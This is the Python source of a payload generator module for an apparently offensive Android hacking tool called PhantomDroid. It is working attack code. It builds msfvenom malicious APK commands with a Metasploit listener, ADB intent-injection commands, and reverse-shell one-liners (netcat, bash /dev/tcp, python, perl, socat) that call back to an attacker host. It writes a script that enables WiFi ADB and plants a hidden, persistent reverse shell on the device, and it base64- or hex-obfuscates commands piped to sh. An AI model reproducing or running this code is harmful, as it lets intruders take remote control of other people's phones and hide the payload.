"""
PhantomDroid — Payload Generator Module
Author: Mr. Psycho | @the_psycho_of_hackers
"""

import subprocess
import os
import base64
import random
import string
import time
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich import box

console = Console()


def _check_tool(tool: str) -> bool:
    try:
        subprocess.run([tool, "--version"], capture_output=True, timeout=5)
        return True
    except FileNotFoundError:
        return False


def generate_msfvenom_apk(lhost: str, lport: int, payload_type: str = "reverse_tcp",
                           output: str = "payload.apk"):
    """Generate a malicious APK using msfvenom."""
    payload_map = {
        "reverse_tcp": "android/meterpreter/reverse_tcp",
        "reverse_https": "android/meterpreter/reverse_https",
        "reverse_http": "android/meterpreter/reverse_http",
        "shell_tcp": "android/shell/reverse_tcp",
    }

    if not _check_tool("msfvenom"):
        console.print("[bold red]✗ msfvenom not found![/] Install Metasploit Framework first.")
        console.print("[dim]Showing command that would be run:[/]")
        payload = payload_map.get(payload_type, "android/meterpreter/reverse_tcp")
        cmd_str = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -o {output}"
        console.print(Panel(cmd_str, title="[bold]msfvenom Command[/]", border_style="yellow"))
        return None

    payload = payload_map.get(payload_type, "android/meterpreter/reverse_tcp")
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-o", output]

    console.print(Panel(
        f"[bold cyan]Generating APK payload[/]\n"
        f"  Payload:  {payload}\n"
        f"  LHOST:    {lhost}\n"
        f"  LPORT:    {lport}\n"
        f"  Output:   {output}",
        border_style="red"))

    with console.status("[cyan]Running msfvenom...[/]"):
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)

    if result.returncode == 0 and os.path.exists(output):
        size = os.path.getsize(output)
        console.print(f"[bold green]✓ APK generated:[/] {output} ({size} bytes)")
        console.print(Panel(
            f"[bold cyan]Start Metasploit listener:[/]\n"
            f"  msfconsole -q -x 'use multi/handler; "
            f"set payload {payload}; set LHOST {lhost}; set LPORT {lport}; run'",
            border_style="green"))
    else:
        console.print(f"[red]✗ msfvenom failed:[/] {result.stderr}")
    return output


def generate_intent_payload(action: str, component: str = None, data: str = None,
                             extras: dict = None, flags: list = None) -> str:
    """Generate an ADB am start payload for intent injection."""
    cmd = ["adb", "shell", "am", "start", "-a", action]
    if component:
        cmd += ["-n", component]
    if data:
        cmd += ["-d", data]
    if extras:
        for k, v in extras.items():
            cmd += ["--es", k, str(v)]
    if flags:
        for f in flags:
            cmd += ["-f", f]

    payload = " ".join(cmd)
    console.print(Panel(payload, title="[bold cyan]Intent Payload[/]", border_style="cyan"))
    return payload


def generate_reverse_shell_commands(lhost: str, lport: int) -> list:
    """Generate multiple reverse shell one-liners for Android/Linux."""
    shells = [
        ("busybox nc",      f"busybox nc {lhost} {lport} -e /system/bin/sh"),
        ("nc traditional",   f"nc -e /system/bin/sh {lhost} {lport}"),
        ("bash TCP",         f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"),
        ("python3",          f"python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/system/bin/sh\",\"-i\"])'"),
        ("perl",             f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/system/bin/sh -i\");'"),
        ("socat",            f"socat exec:'/system/bin/sh -i',pty,stderr tcp:{lhost}:{lport}"),
    ]

    table = Table(title=f"[bold red]💥 Reverse Shell Payloads → {lhost}:{lport}[/]",
                  box=box.SIMPLE_HEAVY, border_style="red", header_style="bold red")
    table.add_column("Method", style="cyan", width=16)
    table.add_column("Command", style="white")
    for method, cmd in shells:
        table.add_row(method, cmd)
    console.print(table)
    return shells


def generate_adb_payload_script(device_id: str = None, lhost: str = "10.0.0.1",
                                 lport: int = 4444, output: str = "adb_payload.sh"):
    """Generate a complete ADB exploitation shell script."""
    script_lines = [
        "#!/bin/bash",
        f"# PhantomDroid — ADB Persist & Shell Payload",
        f"# Author: Mr. Psycho | @the_psycho_of_hackers",
        f"# Target: {'DEVICE_ID' if not device_id else device_id}",
        f"# LHOST: {lhost}  LPORT: {lport}",
        "",
        "ADB='adb'",
        f"DEVICE='{device_id or ''}'",
        f"LHOST='{lhost}'",
        f"LPORT='{lport}'",
        "",
        "[ -n \"$DEVICE\" ] && ADB=\"adb -s $DEVICE\"",
        "",
        "echo '[*] Checking ADB connection...'",
        "$ADB devices",
        "",
        "echo '[*] Enabling developer options...'",
        "$ADB shell settings put global development_settings_enabled 1",
        "",
        "echo '[*] Enabling WiFi ADB...'",
        "$ADB shell setprop service.adb.tcp.port 5555",
        "$ADB shell stop adbd && $ADB shell start adbd",
        "",
        "echo '[*] Getting device IP...'",
        "DEVICE_IP=$($ADB shell ip addr show wlan0 | grep inet | awk '{print $2}' | cut -d/ -f1)",
        "echo \"[+] Device IP: $DEVICE_IP\"",
        "",
        "echo '[*] Dropping reverse shell...'",
        f"$ADB shell 'echo \"busybox nc {lhost} {lport} -e /system/bin/sh\" > /data/local/tmp/.pd.sh'",
        "$ADB shell chmod 755 /data/local/tmp/.pd.sh",
        "$ADB shell nohup /data/local/tmp/.pd.sh &",
        "",
        "echo '[+] Done! Check your listener.'",
        f"echo '[+] If not connected, try: adb connect $DEVICE_IP:5555'",
    ]

    with open(output, "w") as f:
        f.write("\n".join(script_lines))
    os.chmod(output, 0o755)
    console.print(f"[bold green]✓ ADB payload script written:[/] {output}")
    return output


def obfuscate_payload(payload: str, method: str = "base64") -> str:
    """Obfuscate a shell command."""
    if method == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        obfuscated = f"echo {encoded} | base64 -d | sh"
        console.print(Panel(
            f"[bold cyan]Original:[/] {payload}\n\n[bold green]Obfuscated (base64):[/] {obfuscated}",
            title="[bold]Payload Obfuscation[/]", border_style="cyan"))
        return obfuscated

    elif method == "hex":
        hex_encoded = payload.encode().hex()
        pairs = [hex_encoded[i:i+2] for i in range(0, len(hex_encoded), 2)]
        hex_str = "\\x" + "\\x".join(pairs)
        obfuscated = f"echo -e '{hex_str}' | sh"
        console.print(Panel(
            f"[bold cyan]Original:[/] {payload}\n\n[bold green]Obfuscated (hex):[/] {obfuscated}",
            title="[bold]Payload Obfuscation[/]", border_style="cyan"))
        return obfuscated

    return payload


def payload_menu():
    """Display payload generator menu."""
    options = [
        ("1", "Generate APK (msfvenom)"),
        ("2", "Generate Intent Payload"),
        ("3", "Reverse Shell One-Liners"),
        ("4", "ADB Exploitation Script"),
        ("5", "Obfuscate Payload (base64/hex)"),
        ("0", "Back"),
    ]
    t = Table(title="[bold red]🎯 Payload Generator[/]", box=box.DOUBLE_EDGE,
              border_style="red", header_style="bold red")
    t.add_column("Option", style="cyan", width=6)
    t.add_column("Module", style="white")
    for num, desc in options:
        t.add_row(f"[{num}]", desc)
    console.print(t)
    return options
